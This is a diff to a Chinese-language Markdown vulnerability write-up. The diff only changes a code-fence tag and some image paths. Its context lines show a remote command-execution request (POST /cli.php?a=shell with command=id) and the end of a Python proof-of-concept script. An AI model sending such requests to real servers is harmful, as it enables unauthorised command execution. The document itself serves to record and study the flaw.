@@ -151,7 +151,7 @@ command参数直接传入执行了命令
 
 发送请求包
 
-```plain
+```
 POST /cli.php?a=shell HTTP/1.1
 Host: 
 User-Agent: Go-http-client/1.1
@@ -164,7 +164,7 @@ Accept-Encoding: gzip
 notdelay=true&command=id
 ```
 
-![](images/202202110929756.png)
+![](../.gitbook/assets/202202110929756.png)
 
 ## 漏洞POC
 
@@ -253,6 +253,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-
-
-![](images/202202110929316.png)
+![](../.gitbook/assets/202202110929316.png)
